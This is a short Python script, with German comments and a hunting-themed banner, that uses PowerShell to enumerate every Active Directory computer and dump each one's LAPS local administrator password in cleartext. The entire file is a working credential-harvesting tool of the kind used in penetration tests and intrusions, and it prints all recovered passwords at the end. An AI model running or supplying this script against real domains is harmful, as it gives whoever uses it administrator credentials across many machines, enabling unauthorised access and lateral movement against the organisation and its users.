import subprocess
import re

print("Artemis, the Goddess who hunts your local admins!")
# Abrufen aller Computerobjekte aus der Active Directory
p = subprocess.Popen(["powershell.exe", "Import-Module ActiveDirectory; Get-ADComputer -Filter * | Select-Object -ExpandProperty Name"], stdout=subprocess.PIPE)
output, error = p.communicate()
computers = output.decode().strip().split('\r\n')

# Erstellen einer leeren Ergebnistabelle
results = []

# Schleife über alle Computerobjekte
for computer in computers:

    # Abrufen des LAPS-Passworts für den aktuellen Computer
    p = subprocess.Popen(["powershell.exe", f"Get-ADComputer -Identity {computer} -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd"], stdout=subprocess.PIPE)
    output, error = p.communicate()
    password = output.decode().strip()

    # Überprüfen, ob ein LAPS-Passwort vorhanden ist
    if password != "":

        # Hinzufügen der Ergebnisse für den aktuellen Computer zur Ergebnistabelle
        results.append({"ComputerName": computer, "Password": password})

results.sort(key=lambda x: x["ComputerName"])

# Ausgabe der Ergebnistabelle
for result in results:
    print(f"{result['ComputerName']}\t{result['Password']}")


print("The hunt was fruitful!")